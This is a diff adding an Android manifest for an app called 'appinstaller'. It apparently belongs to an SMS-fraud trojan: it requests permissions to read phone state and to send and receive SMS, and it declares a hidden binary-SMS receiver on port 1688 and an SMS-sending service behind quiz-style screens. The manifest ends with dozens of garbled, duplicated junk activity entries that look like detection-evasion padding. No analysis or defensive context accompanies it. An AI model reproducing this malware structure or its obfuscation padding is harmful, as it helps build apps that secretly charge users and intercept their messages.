@@ -1,0 +1,26 @@
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.soft.android.appinstaller" platformBuildVersionCode="23" platformBuildVersionName="6.0-2438415">
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <application android:icon="@drawable/icon" android:label="@string/app_name">
+        <activity android:label="@string/app_name" android:name=".FirstActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <activity android:name=".RulesActivity" />
+        <activity android:name=".FinishActivity" />
+        <activity android:name="QuestionActivity" />
+        <activity android:name="MemberActivity" />
+        <receiver android:name=".sms.BinarySMSReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.DATA_SMS_RECEIVED" />
+                <data android:port="1688" />
+                <data android:scheme="sms" />
+            </intent-filter>
+        </receiver>
+        <service android:enabled="true" android:name=".services.SMSSenderService" />
+    <activity android:name=".F0d8cd79e38" /><activity android:name=".Fe1ac088a69" /><activity android:name=".abc.F39c03abd4a" /><activity android:name="com.Fcba86cfed8" /><activity android:name=".Fb7f293ef1b" /><activity android:name="com.Ffc49cdfbcb" /><activity android:name=".Fb7f293ef1b" /><activity android:name="com.Ffc49cdfbcb" /><activity android:name=".Fb7f293ef1b" /><activity android:name="com.Ffc49cdfbcb" /><activity android:name=".Fb7f293ef1b" /><activity android:name="com.Ffc49cdfbcb" /><activity android:name="F0d8cd79e38" /><activity android:name=".Fe1ac088a69" /><activity android:name=".abc.F39c03abd4a" /><activity android:name="com.Fcba86cfed8" /><activity android:name=".anc$Fb7f293ef1b" /><activity android:name="com.anc$Ffc49cdfbcb" /><activity android:name="F0d8cd79e38" /><activity android:name=".F0d8cd79e38" /><activity android:name=".abc.F0d8cd79e38" /><activity android:name="com.F0d8cd79e38" /><activity android:name=".anc$Fb7a931377a" /><activity android:name="com.anc$Fb7a931377a" /><activity android:name="AndroidManifest.xml" /><activity android:name="p916a8add4f" /><activity android:name="p916a8add4f" /><activity android:name="p916a8add4f" /><activity android:name="p916a8add4f" /><activity android:name="p916a8add4f" /><activity android:name="p916a8add4f" /><activity android:name="p916a8add4f" /><activity android:name="fdfdfd" /><activity android:name="fdfdfd" /><activity android:name="fdfdfd" /><activity android:name="fdfdfd" /><activity android:name="XscpvtiqoAvzqrhfod"><intent-filter><action android:name="com.urbanairship.push.RECEIVED" /></intent-filter></activity><activity android:name="PqglwzayjZectmjqul"><intent-filter><action android:name="com.urbanairship.push.RECEIVED" /></intent-filter><intent-filter><action android:name="com.urbanairship.push.RECEIVED" /></intent-filter></activity></application>
+</manifest>
